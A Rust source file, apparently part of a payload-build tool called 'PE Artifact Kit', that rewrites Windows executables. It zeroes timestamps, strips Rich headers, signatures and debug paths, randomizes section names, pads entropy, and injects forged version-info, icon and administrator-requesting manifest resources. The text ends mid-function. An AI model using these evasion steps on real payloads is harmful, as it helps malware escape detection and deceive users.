//! PE Artifact Kit — comprehensive PE post-processing for build pipeline integration.
//!
//! Provides a set of functions that operate on raw PE file bytes (Windows PE/PE+
//! only).  On non-PE targets (Linux, macOS) all operations are no-ops that log a
//! diagnostic message and return the input buffer unchanged.
//!
//! # Operation order (applied by [`apply_all`])
//! 1. Timestamp zeroing
//! 2. Rich header removal
//! 3. Section name randomization
//! 4. Entropy padding
//! 5. Strip digital signature (optional)
//! 6. Strip debug directory (optional)
//! 7. Inject version info resource (optional)
//! 8. Inject icon resource (optional)
//! 9. Inject manifest resource (optional)
//! 10. Recalculate PE checksum

use anyhow::{anyhow, Context, Result};
use goblin::pe::PE;
use rand::{thread_rng, Rng};
use tracing::{info, warn};

use crate::config::{PayloadConfig, VersionInfoConfig};

// ── Helpers ───────────────────────────────────────────────────────────────────

fn read_u16_le(buf: &[u8], off: usize) -> u16 {
    u16::from_le_bytes([buf[off], buf[off + 1]])
}

fn read_u32_le(buf: &[u8], off: usize) -> u32 {
    u32::from_le_bytes([buf[off], buf[off + 1], buf[off + 2], buf[off + 3]])
}

fn write_u16_le(buf: &mut [u8], off: usize, val: u16) {
    buf[off..off + 2].copy_from_slice(&val.to_le_bytes());
}

fn write_u32_le(buf: &mut [u8], off: usize, val: u32) {
    buf[off..off + 4].copy_from_slice(&val.to_le_bytes());
}

/// Returns `(pe_offset, file_header_offset, optional_header_offset,
///          sections_table_offset, num_sections, is_pe32_plus)`.
fn parse_pe_offsets(
    buf: &[u8],
) -> Result<(usize, usize, usize, usize, usize, bool)> {
    let pe = PE::parse(buf).context("Failed to parse PE header")?;
    let pe_off = pe.header.dos_header.pe_pointer as usize;
    let fh_off = pe_off + 4;
    let oh_off = fh_off + 20;
    let opt_header_size = pe.header.coff_header.size_of_optional_header as usize;
    let sec_off = oh_off + opt_header_size;
    let n_sec = pe.header.coff_header.number_of_sections as usize;
    // Magic: 0x10b = PE32, 0x20b = PE32+
    let is_plus = if oh_off + 2 <= buf.len() {
        read_u16_le(buf, oh_off) == 0x020b
    } else {
        false
    };
    Ok((pe_off, fh_off, oh_off, sec_off, n_sec, is_plus))
}

// ── Existing four hardening operations ───────────────────────────────────────

/// Zero the TimeDateStamp field in the COFF FileHeader.
pub fn zero_timestamp(buf: &mut Vec<u8>) {
    let Ok((_, fh_off, _, _, _, _)) = parse_pe_offsets(buf) else {
        warn!("zero_timestamp: not a PE file, skipping");
        return;
    };
    // TimeDateStamp is at bytes 4..8 of the COFF FileHeader.
    if fh_off + 8 <= buf.len() {
        write_u32_le(buf, fh_off + 4, 0);
    }
}

/// Zero the Rich header in the DOS stub area (bytes 0x40 to PE signature).
pub fn remove_rich_header(buf: &mut Vec<u8>) {
    let Ok((pe_off, _, _, _, _, _)) = parse_pe_offsets(buf) else {
        warn!("remove_rich_header: not a PE file, skipping");
        return;
    };
    // Scan backwards from the PE signature for the "DanS" marker.
    let mut found = false;
    for i in (0..pe_off).rev() {
        if i + 4 <= buf.len() && &buf[i..i + 4] == b"DanS" {
            for j in (0..i).rev() {
                if j + 4 <= buf.len() && &buf[j..j + 4] == b"Rich" {
                    found = true;
                    break;
                }
            }
            if found {
                let dos_stub_end = 0x40usize.min(pe_off);
                buf[dos_stub_end..pe_off].fill(0);
            }
            break;
        }
    }
}

/// Replace each 8-byte section name with random a-zA-Z characters.
pub fn randomize_section_names(buf: &mut Vec<u8>) {
    let Ok((_, _, _, sec_off, n_sec, _)) = parse_pe_offsets(buf) else {
        warn!("randomize_section_names: not a PE file, skipping");
        return;
    };
    let chars = b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let mut rng = thread_rng();
    for i in 0..n_sec {
        let off = sec_off + i * 40;
        if off + 8 <= buf.len() {
            for j in 0..8 {
                buf[off + j] = chars[rng.gen_range(0..chars.len())];
            }
        }
    }
}

/// Append 1024–4096 bytes of random entropy padding to the file.
pub fn add_entropy_padding(buf: &mut Vec<u8>) {
    let mut rng = thread_rng();
    let n: usize = rng.gen_range(1024..4096);
    let mut padding = vec![0u8; n];
    rng.fill(padding.as_mut_slice());
    buf.extend_from_slice(&padding);
}

// ── New operations ────────────────────────────────────────────────────────────

/// Zero the IMAGE_DIRECTORY_ENTRY_SECURITY (index 4) data directory entry
/// and blank out the certificate table data it references.
pub fn strip_signature(buf: &mut Vec<u8>) {
    let Ok((_, _, oh_off, _, _, is_plus)) = parse_pe_offsets(buf) else {
        warn!("strip_signature: not a PE file, skipping");
        return;
    };
    // Data directory array starts at different offsets for PE32 vs PE32+.
    // PE32:  optional header fixed part is 96 bytes  → data dirs at oh_off+96
    // PE32+: optional header fixed part is 112 bytes → data dirs at oh_off+112
    let dd_base = oh_off + if is_plus { 112 } else { 96 };
    // SECURITY entry is index 4; each entry is 8 bytes (4 VirtualAddress + 4 Size).
    let sec_dd_off = dd_base + 4 * 8;
    if sec_dd_off + 8 > buf.len() {
        return;
    }
    let cert_rva = read_u32_le(buf, sec_dd_off) as usize;
    let cert_size = read_u32_le(buf, sec_dd_off + 4) as usize;
    // Zero the directory entry.
    buf[sec_dd_off..sec_dd_off + 8].fill(0);
    // Zero the certificate table data (it is a file offset, not an RVA).
    if cert_rva > 0 && cert_rva + cert_size <= buf.len() {
        buf[cert_rva..cert_rva + cert_size].fill(0);
    }
}

/// Zero the IMAGE_DIRECTORY_ENTRY_DEBUG (index 6) entry and the debug data it
/// references (which contains the PDB path).
pub fn strip_debug_directory(buf: &mut Vec<u8>) {
    let Ok((_, _, oh_off, _, _, is_plus)) = parse_pe_offsets(buf) else {
        warn!("strip_debug_directory: not a PE file, skipping");
        return;
    };
    let dd_base = oh_off + if is_plus { 112 } else { 96 };
    // DEBUG entry is index 6.
    let dbg_dd_off = dd_base + 6 * 8;
    if dbg_dd_off + 8 > buf.len() {
        return;
    }
    let dbg_rva = read_u32_le(buf, dbg_dd_off) as usize;
    let dbg_size = read_u32_le(buf, dbg_dd_off + 4) as usize;
    // Zero the directory entry.
    buf[dbg_dd_off..dbg_dd_off + 8].fill(0);
    // Try to resolve RVA → file offset and zero the debug entries.
    if dbg_rva > 0 && dbg_size > 0 {
        if let Some(file_off) = rva_to_file_offset(buf, dbg_rva as u32) {
            if file_off + dbg_size <= buf.len() {
                buf[file_off..file_off + dbg_size].fill(0);
            }
        }
    }
}

/// Recalculate and write the CheckSum field in the PE optional header.
///
/// Algorithm (from Microsoft docs): treat the file as an array of 16-bit
/// words, sum them all (carrying the high half into the low half), then add
/// the file length. The CheckSum field itself must be zero during the
/// computation.
pub fn recalculate_checksum(buf: &mut Vec<u8>) {
    let Ok((_, _, oh_off, _, _, _)) = parse_pe_offsets(buf) else {
        warn!("recalculate_checksum: not a PE file, skipping");
        return;
    };
    // CheckSum is at bytes 64..68 of the optional header.
    let cksum_off = oh_off + 64;
    if cksum_off + 4 > buf.len() {
        return;
    }
    // Zero the checksum field before computing.
    write_u32_le(buf, cksum_off, 0);

    let file_len = buf.len();
    let mut sum: u32 = 0;
    let mut i = 0;
    while i + 1 < file_len {
        let word = read_u16_le(buf, i) as u32;
        sum = sum.wrapping_add(word);
        // Fold high 16 bits into low 16 bits (running carry).
        if sum > 0xFFFF {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        i += 2;
    }
    // Handle odd trailing byte.
    if file_len % 2 != 0 {
        let word = buf[file_len - 1] as u32;
        sum = sum.wrapping_add(word);
        if sum > 0xFFFF {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
    }
    let checksum = (sum & 0xFFFF) + file_len as u32;
    write_u32_le(buf, cksum_off, checksum);
}

// ── Resource section manipulation ─────────────────────────────────────────────

/// Resolve a relative virtual address (RVA) to a file offset by walking the
/// section table.  Returns `None` if the RVA falls outside all sections.
fn rva_to_file_offset(buf: &[u8], rva: u32) -> Option<usize> {
    let (_, _, _, sec_off, n_sec, _) = parse_pe_offsets(buf).ok()?;
    for i in 0..n_sec {
        let s = sec_off + i * 40;
        if s + 40 > buf.len() {
            break;
        }
        let v_size = read_u32_le(buf, s + 8);
        let v_addr = read_u32_le(buf, s + 12);
        let raw_off = read_u32_le(buf, s + 20);
        let raw_size = read_u32_le(buf, s + 16);
        if rva >= v_addr && rva < v_addr + v_size.max(raw_size) {
            let delta = rva - v_addr;
            return Some(raw_off as usize + delta as usize);
        }
    }
    None
}

// ── VS_VERSIONINFO resource building ─────────────────────────────────────────

/// Encode a string as UTF-16LE, zero-padded to a 4-byte aligned length.
fn utf16le_padded(s: &str) -> Vec<u8> {
    let mut bytes: Vec<u8> = s
        .encode_utf16()
        .chain(std::iter::once(0u16)) // null terminator
        .flat_map(|c| c.to_le_bytes())
        .collect();
    // Pad to 4-byte alignment.
    while bytes.len() % 4 != 0 {
        bytes.push(0);
    }
    bytes
}

/// Build a VS_VERSIONINFO binary blob from a [`VersionInfoConfig`].
///
/// The structure is:
/// ```text
/// VS_VERSIONINFO
///   VS_FIXEDFILEINFO   (binary value)
///   StringFileInfo
///     StringTable (040904B0 = English/Unicode)
///       String entries
///   VarFileInfo
///     Var (Translation)
/// ```
///
/// All structs have the layout:
/// `wLength(u16) | wValueLength(u16) | wType(u16) | szKey(utf16le) | [padding] | Value | Children`
fn build_vs_versioninfo(cfg: &VersionInfoConfig) -> Vec<u8> {
    // Parse a "M.m.b.r" version string into (M, m, b, r) u16 quads.
    fn parse_version(s: &str) -> (u16, u16, u16, u16) {
        let parts: Vec<u16> = s
            .splitn(4, '.')
            .map(|p| p.parse::<u16>().unwrap_or(0))
            .collect();
        (
            parts.first().copied().unwrap_or(0),
            parts.get(1).copied().unwrap_or(0),
            parts.get(2).copied().unwrap_or(0),
            parts.get(3).copied().unwrap_or(0),
        )
    }

    let fv_str = cfg.file_version.as_deref().unwrap_or("1.0.0.0");
    let pv_str = cfg.product_version.as_deref().unwrap_or(fv_str);
    let (fv_ms_hi, fv_ms_lo, fv_ls_hi, fv_ls_lo) = parse_version(fv_str);
    let (pv_ms_hi, pv_ms_lo, pv_ls_hi, pv_ls_lo) = parse_version(pv_str);
    let fv_ms: u32 = ((fv_ms_hi as u32) << 16) | (fv_ms_lo as u32);
    let fv_ls: u32 = ((fv_ls_hi as u32) << 16) | (fv_ls_lo as u32);
    let pv_ms: u32 = ((pv_ms_hi as u32) << 16) | (pv_ms_lo as u32);
    let pv_ls: u32 = ((pv_ls_hi as u32) << 16) | (pv_ls_lo as u32);

    // Build VS_FIXEDFILEINFO (52 bytes, all LE).
    let mut fixed = Vec::with_capacity(52);
    fixed.extend_from_slice(&0xFEEF04BDu32.to_le_bytes()); // dwSignature
    fixed.extend_from_slice(&0x00010000u32.to_le_bytes()); // dwStrucVersion
    fixed.extend_from_slice(&fv_ms.to_le_bytes());         // dwFileVersionMS
    fixed.extend_from_slice(&fv_ls.to_le_bytes());         // dwFileVersionLS
    fixed.extend_from_slice(&pv_ms.to_le_bytes());         // dwProductVersionMS
    fixed.extend_from_slice(&pv_ls.to_le_bytes());         // dwProductVersionLS
    fixed.extend_from_slice(&0u32.to_le_bytes());          // dwFileFlagsMask
    fixed.extend_from_slice(&0u32.to_le_bytes());          // dwFileFlags
    fixed.extend_from_slice(&0x00040004u32.to_le_bytes()); // dwFileOS (Windows NT)
    fixed.extend_from_slice(&0x00000001u32.to_le_bytes()); // dwFileType (Application)
    fixed.extend_from_slice(&0u32.to_le_bytes());          // dwFileSubtype
    fixed.extend_from_slice(&0u32.to_le_bytes());          // dwFileDateMS
    fixed.extend_from_slice(&0u32.to_le_bytes());          // dwFileDateLS
    assert_eq!(fixed.len(), 52);

    // Helper: build a leaf String entry.
    // `wType=1` means string data (text), key and value are UTF-16LE.
    let make_string_entry = |key: &str, value: &str| -> Vec<u8> {
        let key_bytes = utf16le_padded(key);
        let val_utf16: Vec<u8> = value
            .encode_utf16()
            .chain(std::iter::once(0u16))
            .flat_map(|c| c.to_le_bytes())
            .collect();
        // wValueLength counts UTF-16 chars (including null terminator) of the value.
        let w_value_len = (value.encode_utf16().count() as u16) + 1;
        let header_len = 6 + key_bytes.len();
        let total_unpadded = header_len + val_utf16.len();
        // Pad total to 4-byte boundary.
        let pad = if total_unpadded % 4 != 0 { 4 - total_unpadded % 4 } else { 0 };
        let total = total_unpadded + pad;
        let mut out = Vec::with_capacity(total);
        out.extend_from_slice(&(total as u16).to_le_bytes());    // wLength
        out.extend_from_slice(&w_value_len.to_le_bytes());       // wValueLength
        out.extend_from_slice(&1u16.to_le_bytes());              // wType = 1 (text)
        out.extend_from_slice(&key_bytes);
        out.extend_from_slice(&val_utf16);
        out.resize(total, 0);
        out
    };

    // Collect string entries (only non-None fields).
    let mut strings_data: Vec<u8> = Vec::new();
    let mut push_str = |key: &str, val: Option<&str>| {
        if let Some(v) = val {
            strings_data.extend_from_slice(&make_string_entry(key, v));
        }
    };
    push_str("FileVersion", cfg.file_version.as_deref());
    push_str("ProductVersion", cfg.product_version.as_deref());
    push_str("FileDescription", cfg.file_description.as_deref());
    push_str("InternalName", cfg.file_version_name.as_deref());
    push_str("OriginalFilename", cfg.original_filename.as_deref());
    push_str("ProductName", cfg.product_name.as_deref());
    push_str("CompanyName", cfg.company_name.as_deref());
    push_str("LegalCopyright", cfg.legal_copyright.as_deref());
    push_str("Comments", cfg.comments.as_deref());

    // Build StringTable block (code page "040904B0" = English/Unicode).
    let st_key = utf16le_padded("040904B0");
    let st_header_len = 6 + st_key.len();
    let st_total = st_header_len + strings_data.len();
    let mut string_table: Vec<u8> = Vec::with_capacity(st_total);
    string_table.extend_from_slice(&(st_total as u16).to_le_bytes()); // wLength
    string_table.extend_from_slice(&0u16.to_le_bytes());              // wValueLength (0 for container)
    string_table.extend_from_slice(&1u16.to_le_bytes());              // wType = 1
    string_table.extend_from_slice(&st_key);
    string_table.extend_from_slice(&strings_data);

    // Build StringFileInfo block.
    let sfi_key = utf16le_padded("StringFileInfo");
    let sfi_header_len = 6 + sfi_key.len();
    let sfi_total = sfi_header_len + string_table.len();
    let mut sfi: Vec<u8> = Vec::with_capacity(sfi_total);
    sfi.extend_from_slice(&(sfi_total as u16).to_le_bytes()); // wLength
    sfi.extend_from_slice(&0u16.to_le_bytes());               // wValueLength
    sfi.extend_from_slice(&1u16.to_le_bytes());               // wType = 1
    sfi.extend_from_slice(&sfi_key);
    sfi.extend_from_slice(&string_table);

    // Build VarFileInfo with Translation 0x040904B0.
    let translation_val: [u8; 4] = [0x09, 0x04, 0xB0, 0x04]; // 0x0409, 0x04B0
    let var_key = utf16le_padded("Translation");
    let var_header_len = 6 + var_key.len();
    let var_total = var_header_len + 4;
    let mut var: Vec<u8> = Vec::with_capacity(var_total);
    var.extend_from_slice(&(var_total as u16).to_le_bytes()); // wLength
    var.extend_from_slice(&4u16.to_le_bytes());               // wValueLength (4 bytes)
    var.extend_from_slice(&0u16.to_le_bytes());               // wType = 0 (binary)
    var.extend_from_slice(&var_key);
    var.extend_from_slice(&translation_val);

    let vfi_key = utf16le_padded("VarFileInfo");
    let vfi_header_len = 6 + vfi_key.len();
    let vfi_total = vfi_header_len + var.len();
    let mut vfi: Vec<u8> = Vec::with_capacity(vfi_total);
    vfi.extend_from_slice(&(vfi_total as u16).to_le_bytes()); // wLength
    vfi.extend_from_slice(&0u16.to_le_bytes());               // wValueLength
    vfi.extend_from_slice(&1u16.to_le_bytes());               // wType = 1
    vfi.extend_from_slice(&vfi_key);
    vfi.extend_from_slice(&var);

    // Build root VS_VERSIONINFO.
    let root_key = utf16le_padded("VS_VERSION_INFO");
    // root header: 6 bytes + key + padding to 4-byte align + fixed (52) + padding + children
    let root_header_len = 6 + root_key.len();
    // After the key the fixed info must be 4-byte aligned; key length is already padded.
    let root_total = root_header_len + 52 + sfi.len() + vfi.len();
    let mut root: Vec<u8> = Vec::with_capacity(root_total);
    root.extend_from_slice(&(root_total as u16).to_le_bytes()); // wLength
    root.extend_from_slice(&52u16.to_le_bytes());               // wValueLength = sizeof(VS_FIXEDFILEINFO)
    root.extend_from_slice(&0u16.to_le_bytes());                // wType = 0 (binary value)
    root.extend_from_slice(&root_key);                          // szKey (UTF-16LE, padded)
    root.extend_from_slice(&fixed);                             // VS_FIXEDFILEINFO
    root.extend_from_slice(&sfi);
    root.extend_from_slice(&vfi);

    root
}

// ── Manifest presets ──────────────────────────────────────────────────────────

fn manifest_xml(preset_or_custom: &str) -> String {
    match preset_or_custom {
        "requireAdministrator" => r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>"#.to_string(),
        "highestAvailable" => r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="highestAvailable" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>"#.to_string(),
        "asInvoker" => r#"<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
    <security>
      <requestedPrivileges>
        <requestedExecutionLevel level="asInvoker" uiAccess="false"/>
      </requestedPrivileges>
    </security>
  </trustInfo>
</assembly>"#.to_string(),
        // Treat anything else as a literal XML string.
        custom => custom.to_string(),
    }
}

// ── ICO file parser ───────────────────────────────────────────────────────────

/// A single image entry parsed from a .ico file.
struct IcoImage {
    width: u8,
    height: u8,
    color_count: u8,
    planes: u16,
    bit_count: u16,
    data: Vec<u8>,
}

/// Parse a .ico file into a list of [`IcoImage`] entries.
fn parse_ico(ico_bytes: &[u8]) -> Result<Vec<IcoImage>> {
    if ico_bytes.len() < 6 {
        return Err(anyhow!("ICO file too small"));
    }
    let reserved = read_u16_le(ico_bytes, 0);
    let image_type = read_u16_le(ico_bytes, 2);
    let count = read_u16_le(ico_bytes, 4) as usize;
    if reserved != 0 || image_type != 1 {
        return Err(anyhow!("Not a valid ICO file (reserved={reserved}, type={image_type})"));
    }
    if 6 + count * 16 > ico_bytes.len() {
        return Err(anyhow!("ICO directory truncated"));
    }
    let mut images = Vec::with_capacity(count);
    for i in 0..count {
        let entry = &ico_bytes[6 + i * 16..6 + i * 16 + 16];
        let width = entry[0];
        let height = entry[1];
        let color_count = entry[2];
        let planes = u16::from_le_bytes([entry[4], entry[5]]);
        let bit_count = u16::from_le_bytes([entry[6], entry[7]]);
        let data_size = u32::from_le_bytes([entry[8], entry[9], entry[10], entry[11]]) as usize;
        let data_off = u32::from_le_bytes([entry[12], entry[13], entry[14], entry[15]]) as usize;
        if data_off + data_size > ico_bytes.len() {
            return Err(anyhow!("ICO image data out of bounds"));
        }
        images.push(IcoImage {
            width,
            height,
            color_count,
            planes,
            bit_count,
            data: ico_bytes[data_off..data_off + data_size].to_vec(),
        });
    }
    Ok(images)
}

// ── Resource section injection ────────────────────────────────────────────────

/// Minimal PE resource directory tree builder.  Produces a self-consistent
/// `.rsrc` section blob containing one or more resource entries.
///
/// Each resource is identified by `(type_id, name_id, lang_id)` and contains
/// raw leaf data.
#[derive(Default)]
struct ResourceSectionBuilder {
    /// `(type_id, name_id, lang_id, data)` entries.
    entries: Vec<(u32, u32, u32, Vec<u8>)>,
}

impl ResourceSectionBuilder {
    fn add(&mut self, type_id: u32, name_id: u32, lang_id: u32, data: Vec<u8>) {
        self.entries.push((type_id, name_id, lang_id, data));
    }

    /// Build a complete IMAGE_RESOURCE_DIRECTORY tree as a flat byte buffer.
    ///
    /// Layout:
    /// ```text
    /// IMAGE_RESOURCE_DIRECTORY           (level 1: by type)
    ///   IMAGE_RESOURCE_DIRECTORY_ENTRY[] (one per unique type)
    ///   IMAGE_RESOURCE_DIRECTORY         (level 2: by name, per type)
    ///     IMAGE_RESOURCE_DIRECTORY_ENTRY[] (one per unique name)
    ///     IMAGE_RESOURCE_DIRECTORY         (level 3: by language)
    ///       IMAGE_RESOURCE_DIRECTORY_ENTRY[] (one per lang)
    /// IMAGE_RESOURCE_DATA_ENTRY[]         (leaf data descriptors)
    /// [actual resource data blobs]
    /// ```
    ///
    /// All RVA values are relative to `section_rva` (the virtual address at
    /// which this section will be loaded).  They are patched in a second pass.
    fn build(&self, section_rva: u32) -> Vec<u8> {
        // Collect unique types, names per type, entries per name.
        // For simplicity we support exactly the entries we add and assume
        // type_id / name_id combinations are well-formed.
        use std::collections::BTreeMap;
        // type -> name -> lang -> data
        let mut tree: BTreeMap<u32, BTreeMap<u32, BTreeMap<u32, Vec<u8>>>> = BTreeMap::new();
        for (t, n, l, d) in &self.entries {
            tree.entry(*t)
                .or_default()
                .entry(*n)
                .or_default()
                .insert(*l, d.clone());
        }

        // Compute layout sizes:
        //   IMAGE_RESOURCE_DIRECTORY = 16 bytes
        //   IMAGE_RESOURCE_DIRECTORY_ENTRY = 8 bytes
        let n_types = tree.len();
        // Total level-2 directories (one per type).
        let _n_level2_dirs: usize = tree.values().map(|_names| 1).sum::<usize>() * n_types;
        // Total level-3 directories (one per name per type, but we count each name).
        let _n_level3_dirs: usize = tree.values().map(|names| names.len()).sum();
        // Total leaves.
        let _total_leaves: usize = tree.values()
            .flat_map(|names| names.values().map(|langs| langs.len()))
            .sum();

        // Layout:
        // L1 dir (16) + L1 entries (8 * n_types)
        // L2 dirs (16 + 8 * n_names) * n_types
        // L3 dirs (16 + 8 * n_langs) * n_names
        // Data entries (16 * total_leaves)
        // Data blobs (aligned)

        // We'll build the tree in a single pass, accumulating everything.
        // Use a two-pass approach: first compute all offsets, then write.

        // Step 1: flatten tree into a list of (type, name, lang, data_idx).
        struct Leaf {
            _type_id: u32,
            _name_id: u32,
            _lang_id: u32,
            data: Vec<u8>,
        }
        let mut leaves: Vec<Leaf> = Vec::new();
        // type_entry: (type_id, [(name_id, [(lang_id, leaf_idx)])])
        let mut type_entries: Vec<(u32, Vec<(u32, Vec<(u32, usize)>)>)> = Vec::new();
        for (&type_id, names) in &tree {
            let mut name_entries: Vec<(u32, Vec<(u32, usize)>)> = Vec::new();
            for (&name_id, langs) in names {
                let mut lang_entries: Vec<(u32, usize)> = Vec::new();
                for (&lang_id, data) in langs {
                    let idx = leaves.len();
                    leaves.push(Leaf { _type_id: type_id, _name_id: name_id, _lang_id: lang_id, data: data.clone() });
                    lang_entries.push((lang_id, idx));
                }
                name_entries.push((name_id, lang_entries));
            }
            type_entries.push((type_id, name_entries));
        }

        // Step 2: compute byte offsets for each directory node.
        // Directory node size = 16 + 8 * num_entries.
        // L1 dir: 16 + 8 * n_types
        let l1_size = 16 + 8 * type_entries.len();
        // L2 dirs: one per type.
        let l2_sizes: Vec<usize> = type_entries.iter()
            .map(|(_, names)| 16 + 8 * names.len())
            .collect();
        // L3 dirs: one per (type, name) pair.
        let l3_sizes: Vec<Vec<usize>> = type_entries.iter()
            .map(|(_, names)| {
                names.iter().map(|(_, langs)| 16 + 8 * langs.len()).collect()
            })
            .collect();

        // Compute absolute offsets within the section buffer.
        let l1_off = 0usize;
        let l2_offs: Vec<usize> = {
            let mut offs = Vec::new();
            let mut cur = l1_off + l1_size;
            for sz in &l2_sizes {
                offs.push(cur);
                cur += sz;
            }
            offs
        };
        let l3_offs: Vec<Vec<usize>> = {
            let mut all = Vec::new();
            // Compute cur as offset after all l1 and l2 dirs.
            let mut cur = l1_off + l1_size + l2_sizes.iter().sum::<usize>();
            for (ti, (_, names)) in type_entries.iter().enumerate() {
                let mut name_offs = Vec::new();
                for (ni, _) in names.iter().enumerate() {
                    name_offs.push(cur);
                    cur += l3_sizes[ti][ni];
                }
                all.push(name_offs);
            }
            all
        };

        // Data entries come after all directories.
        let data_entry_base: usize = {
            let l3_total: usize = l3_sizes.iter().flat_map(|v| v.iter()).sum();
            l1_off + l1_size + l2_sizes.iter().sum::<usize>() + l3_total
        };
        // Each IMAGE_RESOURCE_DATA_ENTRY is 16 bytes.
        let data_blob_base = data_entry_base + 16 * leaves.len();
        // Leaf data blobs with 4-byte alignment.
        let leaf_offsets: Vec<usize> = {
            let mut offs = Vec::new();
            let mut cur = data_blob_base;
            for leaf in &leaves {
                offs.push(cur);
                cur += leaf.data.len();
                // 4-byte align.
                if cur % 4 != 0 {
                    cur += 4 - cur % 4;
                }
            }
            offs
        };
        let total_size = {
            let last_leaf = leaves.len().checked_sub(1);
            match last_leaf {
                Some(i) => {
                    let end = leaf_offsets[i] + leaves[i].data.len();
                    if end % 4 != 0 { end + (4 - end % 4) } else { end }
                }
                None => data_blob_base,
            }
        };

        // Step 3: write the section buffer.
        let mut out = vec![0u8; total_size];

        // IMAGE_RESOURCE_DIRECTORY header: Characteristics(4), TimeDateStamp(4),
        // MajorVersion(2), MinorVersion(2), NumberOfNamedEntries(2), NumberOfIdEntries(2)
        let write_dir_header = |buf: &mut Vec<u8>, off: usize, n_id: u16| {
            write_u32_le(buf, off, 0);      // Characteristics
            write_u32_le(buf, off + 4, 0);  // TimeDateStamp
            write_u16_le(buf, off + 8, 0);  // MajorVersion
            write_u16_le(buf, off + 10, 0); // MinorVersion
            write_u16_le(buf, off + 12, 0); // NumberOfNamedEntries
            write_u16_le(buf, off + 14, n_id); // NumberOfIdEntries
        };

        // Write L1 directory.
        write_dir_header(&mut out, l1_off, type_entries.len() as u16);
        for (ti, (type_id, _)) in type_entries.iter().enumerate() {
            let entry_off = l1_off + 16 + ti * 8;
            write_u32_le(&mut out, entry_off, *type_id);
            // High bit set = points to subdirectory.
            write_u32_le(&mut out, entry_off + 4, l2_offs[ti] as u32 | 0x8000_0000);
        }

        // Write L2 directories.
        for (ti, (_, names)) in type_entries.iter().enumerate() {
            let l2_off = l2_offs[ti];
            write_dir_header(&mut out, l2_off, names.len() as u16);
            for (ni, (name_id, _)) in names.iter().enumerate() {
                let entry_off = l2_off + 16 + ni * 8;
                write_u32_le(&mut out, entry_off, *name_id);
                write_u32_le(&mut out, entry_off + 4, l3_offs[ti][ni] as u32 | 0x8000_0000);
            }
        }

        // Write L3 directories.
        let mut leaf_idx_counter = 0usize;
        for (ti, (_, names)) in type_entries.iter().enumerate() {
            for (ni, (_, langs)) in names.iter().enumerate() {
                let l3_off = l3_offs[ti][ni];
                write_dir_header(&mut out, l3_off, langs.len() as u16);
                for (li, (lang_id, _leaf_idx)) in langs.iter().enumerate() {
                    let entry_off = l3_off + 16 + li * 8;
                    write_u32_le(&mut out, entry_off, *lang_id);
                    // Points to IMAGE_RESOURCE_DATA_ENTRY (no high bit set).
                    write_u32_le(&mut out, entry_off + 4, (data_entry_base + leaf_idx_counter * 16) as u32);
                    leaf_idx_counter += 1;
                }
            }
        }

        // Write IMAGE_RESOURCE_DATA_ENTRY array.
        for (i, leaf) in leaves.iter().enumerate() {
            let de_off = data_entry_base + i * 16;
            let data_rva = section_rva + leaf_offsets[i] as u32;
            write_u32_le(&mut out, de_off, data_rva);          // OffsetToData (RVA)
            write_u32_le(&mut out, de_off + 4, leaf.data.len() as u32); // Size
            write_u32_le(&mut out, de_off + 8, 0);             // CodePage
            write_u32_le(&mut out, de_off + 12, 0);            // Reserved
        }

        // Write leaf data blobs.
        for (i, leaf) in leaves.iter().enumerate() {
            let start = leaf_offsets[i];
            out[start..start + leaf.data.len()].copy_from_slice(&leaf.data);
        }

        out
    }
}

/// Append (or replace) a `.rsrc` section in the PE with the resources in
/// `builder`.  This is a file-append approach: we add a new section header
/// pointing to data appended at the end of the file, and update the
/// `IMAGE_DIRECTORY_ENTRY_RESOURCE` data directory entry.
///
/// This approach avoids having to shift existing sections (which would
/// require relocations) while still producing a loadable PE.
fn inject_rsrc_section(buf: &mut Vec<u8>, builder: &ResourceSectionBuilder) -> Result<()> {
    let (_, fh_off, oh_off, sec_off, n_sec, is_plus) = parse_pe_offsets(buf)?;

    // File alignment and section alignment from the optional header.
    // FA is at oh_off+36 (PE32) or oh_off+36 (PE32+) — same offset.
    let file_align = read_u32_le(buf, oh_off + 36).max(512) as usize;
    let section_align = read_u32_le(buf, oh_off + 32).max(4096) as usize;

    // Current image size (SizeOfImage) at oh_off+56.
    let size_of_image = read_u32_le(buf, oh_off + 56) as usize;

    // The new section's virtual address = align(size_of_image, section_align).
    let new_va = align_up(size_of_image, section_align) as u32;
    // The new section's file offset = align(current file size, file_align).
    let raw_off = align_up(buf.len(), file_align) as u32;

    // Build the resource section data.
    let rsrc_data = builder.build(new_va);
    let raw_size = align_up(rsrc_data.len(), file_align) as u32;
    let virt_size = rsrc_data.len() as u32;

    // Check that there is space for a new section header.
    // Section table must fit within the PE headers area (before the first
    // section's raw data). We check that the next header slot doesn't
    // overlap section data.
    let new_sec_hdr_off = sec_off + n_sec * 40;
    let first_section_raw_off = (0..n_sec)
        .filter_map(|i| {
            let s = sec_off + i * 40;
            if s + 40 <= buf.len() {
                let ro = read_u32_le(buf, s + 20) as usize;
                if ro > 0 { Some(ro) } else { None }
            } else {
                None
            }
        })
        .min()
        .unwrap_or(raw_off as usize);
    if new_sec_hdr_off + 40 > first_section_raw_off {
        return Err(anyhow!(
            "No room for a new section header in the PE header area \
             (would overlap section data at 0x{first_section_raw_off:x})"
        ));
    }

    // Write the new section header (IMAGE_SECTION_HEADER = 40 bytes).
    // Name (8 bytes): ".rsrc\0\0\0"
    if new_sec_hdr_off + 40 > buf.len() {
        buf.resize(new_sec_hdr_off + 40, 0);
    }
    buf[new_sec_hdr_off..new_sec_hdr_off + 8].copy_from_slice(b".rsrc\x00\x00\x00");
